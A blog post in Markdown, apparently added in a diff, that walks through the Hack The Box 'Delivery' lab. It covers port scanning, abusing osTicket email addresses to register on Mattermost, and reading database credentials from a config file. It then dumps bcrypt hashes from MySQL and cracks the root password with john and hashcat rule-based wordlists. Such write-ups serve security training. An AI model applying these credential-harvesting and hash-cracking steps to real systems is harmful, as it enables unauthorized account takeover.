@@ -1,0 +1,272 @@
+---
+title: Delivery Writeup - Hack The Box
+description: Exploiting osTicket email forwarding and Mattermost registration for initial access, then cracking bcrypt password hashes with custom wordlists for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-16
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local:~$ nmap -p- --min-rate 1000 10.129.60.142
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-15 19:15 EEST
+Nmap scan report for 10.129.60.142
+Host is up (0.062s latency).
+Not shown: 64772 closed tcp ports (reset), 760 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8065/tcp open  unknown
+
+nontas@local:~$ nmap -p 22,80,8065 -sVC 10.129.60.142
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-15 19:18 EEST
+Nmap scan report for 10.129.60.142
+Host is up (0.055s latency).
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
+|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
+|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
+80/tcp   open  http    nginx 1.14.2
+|_http-title: delivery
+|_http-server-header: nginx/1.14.2
+8065/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Accept-Ranges: bytes
+|     Cache-Control: no-cache, max-age=31556926, public
+|     Content-Length: 3108
+|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
+|     Content-Type: text/html; charset=utf-8
+|     Last-Modified: Wed, 15 Oct 2025 16:10:40 GMT
+|     X-Frame-Options: SAMEORIGIN
+|     X-Request-Id: 3a3698s3epne3ed4yadddcfezr
+|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+|     Date: Wed, 15 Oct 2025 16:18:39 GMT
+|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
+|   HTTPOptions:
+|     HTTP/1.0 405 Method Not Allowed
+|     Date: Wed, 15 Oct 2025 16:18:39 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8065-TCP:V=7.93%I=7%D=10/15%Time=68EFC95E%P=aarch64-unknown-linux-g
+<SNIP>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.20 seconds
+```
+Seems like there are 2 web apps, one on port `80` and another on port `8065`.
+
+The website at port `80` is the following: ![IMG-20251015192027630](/images/blog/delivery/IMG-20251015192027630.png)
+
+Clicking "Contant Us" shows the following: ![IMG-20251015192243754](/images/blog/delivery/IMG-20251015192243754.png)
+
+Clicking "HelpDesk" tries to redirect us to `helpdesk.delivery.htb`, so add it to `/etc/hosts`. Also clicking "MatterMost server" tries to redirect us to `delivery.htb:8065`, so add `delivery.htb` in there as well:
+```console title="Hosts configuration"
+10.129.60.142 helpdesk.delivery.htb delivery.htb
+```
+
+`delivery.htb:8065` shows this login page: ![IMG-20251016120029426](/images/blog/delivery/IMG-20251016120029426.png)
+
+While `helpdesk.delivery.htb` shows a support center powered by `osTicket`: ![IMG-20251015192736930](/images/blog/delivery/IMG-20251015192736930.png)
+
+## Initial Foothold
+### Creating a Ticket
+Let's open a new ticket: ![IMG-20251016115119178](/images/blog/delivery/IMG-20251016115119178.png)
+
+We get the following confirmation message: ![IMG-20251016115209868](/images/blog/delivery/IMG-20251016115209868.png)
+
+Note that it gave us the email `3595117@delivery.htb` and the ticked id `3595117`.
+
+Now we can check our ticket status with our email and ticket id: ![IMG-20251016115642167](/images/blog/delivery/IMG-20251016115642167.png)
+
+![IMG-20251016115700366](/images/blog/delivery/IMG-20251016115700366.png)
+
+### Verification Email
+Going back to `Mattermost`, we can attempt to create an account with any email, but it asks us to verify the email address: ![IMG-20251016120258623](/images/blog/delivery/IMG-20251016120258623.png)
+
+Since we cannot do that, we'll use the email that `osTicket` gave us, in order to create an account: ![IMG-20251016120458222](/images/blog/delivery/IMG-20251016120458222.png)
+
+Going back to `osTicket`, we see the verification email: ![IMG-20251016120540290](/images/blog/delivery/IMG-20251016120540290.png)
+
+And open the link inside the email: ![IMG-20251016120624745](/images/blog/delivery/IMG-20251016120624745.png)
+
+### Internal Conversations
+We can now see the following page: ![IMG-20251016120651838](/images/blog/delivery/IMG-20251016120651838.png)
+
+Going to the `Internal` public channel, we see the following conversation: ![IMG-20251016120910880](/images/blog/delivery/IMG-20251016120910880.png)
+
+There's a set of credentials `maildeliverer:Youve_G0t_Mail!`, as well as a hint about passwords of the variant `PleaseSubscribe!`.
+
+Use them to SSH into the host:
+```console title="SSH login"
+nontas@local:~$ ssh maildeliverer@delivery.htb
+<SNIP>
+maildeliverer@delivery.htb's password:
+<SNIP>
+maildeliverer@Delivery:~$ cat user.txt
+```
+
+And get the user flag.
+
+## Privilege Escalation
+### Grabbing Hash from config
+[This](https://docs.mattermost.com/administration-guide/configure/configuration-settings.html) page tells us that the config file for `Mattermost` is located at `mattermost/config`, i.e. at `/opt/mattermost/config`:
+```console title="Mattermost configuration"
+maildeliverer@Delivery:~$ ls /opt/mattermost/config/
+cloud_defaults.json  config.json  README.md
+maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json
+<SNIP>
+"SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false
+    },
+<SNIP>
+```
+
+We find the `mysql` credentials `mmuser:Crack_The_MM_Admin_PW`, and the database `mattermost`. Use them to access the database:
+```console title="Database access"
+maildeliverer@Delivery:~$ mysql -u mmuser -p
+Enter password:
+<SNIP>
+
+MariaDB [(none)]> USE mattermost;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mattermost]> SHOW TABLES;
++------------------------+
+| Tables_in_mattermost   |
++------------------------+
+<SNIP>
+| UploadSessions         |
+| UserAccessTokens       |
+| UserGroups             |
+| UserTermsOfService     |
+| Users                  |
++------------------------+
+46 rows in set (0.000 sec)
+
+MariaDB [mattermost]> DESCRIBE Users;
++--------------------+--------------+------+-----+---------+-------+
+| Field              | Type         | Null | Key | Default | Extra |
++--------------------+--------------+------+-----+---------+-------+
+| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
+| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
+| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
+|
+ DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
+| Username           | varchar(64)  | YES  | UNI | NULL    |       |
+| Password           | varchar(128) | YES  |     | NULL    |       |
+| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
+| AuthService        | varchar(32)  | YES  |     | NULL    |       |
+| Email              | varchar(128) | YES  | UNI | NULL    |       |
+| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
+| Nickname           | varchar(64)  | YES  |     | NULL    |       |
+| FirstName          | varchar(64)  | YES  |     | NULL    |       |
+| LastName           | varchar(64)  | YES  |     | NULL    |       |
+| Position           | varchar(128) | YES  |     | NULL    |       |
+| Roles              | text         | YES  |     | NULL    |       |
+| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
+| Props              | text         | YES  |     | NULL    |       |
+| NotifyProps        | text         | YES  |     | NULL    |       |
+| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
+| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
+| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
+| Locale             | varchar(5)   | YES  |     | NULL    |       |
+| Timezone           | text         | YES  |     | NULL    |       |
+| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
+| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
++--------------------+--------------+------+-----+---------+-------+
+25 rows in set (0.001 sec)
+
+MariaDB [mattermost]> SELECT Username, Password FROM Users;
++----------------------------------+--------------------------------------------------------------+
+| Username                         | Password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+| nontasbak                        | $2a$10$ZxXxPUMv20TjN/IvRkX6cuxwczO80m4fJSVsP9EEurevdlJ3Oj53O |
++----------------------------------+--------------------------------------------------------------+
+9 rows in set (0.000 sec)
+```
+
+We found the `root` user with the hashed password `$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`. The format of the hash is `bcrypt`, from the prefix `$2a$`.
+
+### Password Cracking
+Remember back in the internal messages that the password doesn't exist inside `rockyou.txt`. Instead, we need to create variations of the password `PleaseSubscribe!`.
+
+First, save the base word into `base_word.txt`:
+```console
+echo "PleaseSubscribe\!" > base_word.txt
+```
+
+Then, apply the `best64` rules to create a custom wordlist:
+```console title="Custom wordlist generation"
+nontas@local:~$ john --wordlist=base_word.txt --rules=best64 --stdout > wordlist.txt
+```
+
+Finally, crack the password. I've saved the hash inside `hash.txt`:
+```console title="Hash cracking"
+nontas@local:~$ john --wordlist=wordlist.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+PleaseSubscribe!21 (?)
+1g 0:00:00:00 DONE (2025-10-16 13:54) 3.448g/s 82.76p/s 82.76c/s 82.76C/s PleaseSubscribe!..PleaseSubscribe!69
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+The password for `root` is `PleaseSubscribe!21`.
+
+<Callout title="Using hashcat" type="info">
+```bash
+hashcat -m 3200 hash.txt base_word.txt -r /usr/share/hashcat/rules/best64.rule
+```
+Where `3200` is the hash mode.
+
+Or If you want to save the variations into
+ `wordlist.txt`:
+```bash
+$ echo "PleaseSubscribe\!" | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
+$ hashcat -m 3200 hash.txt wordlist.txt
+```
+</Callout>
+
+Now back to our SSH session, switch user to `root` and get the root flag:
+```console title="Root access"
+maildeliverer@Delivery:~$ su - root
+Password:
+root@Delivery:~# cat root.txt
+```
+
+We have successfully completed **Delivery**!
